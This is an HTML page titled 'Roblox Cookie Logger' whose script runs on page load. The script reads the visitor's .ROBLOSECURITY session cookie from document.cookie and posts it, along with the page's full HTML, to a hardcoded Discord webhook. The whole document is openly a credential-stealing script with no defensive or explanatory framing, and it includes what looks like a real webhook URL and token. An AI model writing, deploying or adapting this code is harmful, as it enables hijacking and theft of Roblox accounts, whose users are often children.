<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cookie Logger</title>
</head>
<body>

<!-- Include the script to extract Roblox cookie and send it to Discord -->
<script>
    // Function to extract Roblox cookie
    function extractRobloxCookie() {
        // Attempt to access the Roblox cookie
        var robloxCookie = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);

        // If the cookie is found, print it to the console
        if (robloxCookie) {
            var cookieValue = robloxCookie[1];
            console.log('Roblox Cookie:', cookieValue); // Print the Roblox cookie to the console

            // Send the Roblox cookie to Discord webhook
            var endpoint = 'https://discord.com/api/webhooks/1231774438463242290/PP9iMkmZa0F81Zp3QUwuEAh5uGd2jvw86T0e5KypWYaoHKqXRqAvvkVHPOEKZsO4mRFx'; // Replace with your actual Discord webhook endpoint

            fetch(endpoint, {
                method: 'POST',
                body: JSON.stringify({
                    robloxCookie: cookieValue,
                    htmlContent: document.documentElement.outerHTML // Include the HTML content of the page
                }),
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => {
                if (response.ok) {
                    console.log('Roblox cookie sent to Discord webhook successfully!');
                } else {
                    console.error('Failed to send Roblox cookie to Discord webhook:', response.status, response.statusText);
                }
            })
            .catch(error => {
                console.error('Error sending Roblox cookie to Discord webhook:', error.message);
            });
        }
    }

    // Call the function to extract and potentially send the Roblox cookie
    extractRobloxCookie();
</script>

</body>
</html>
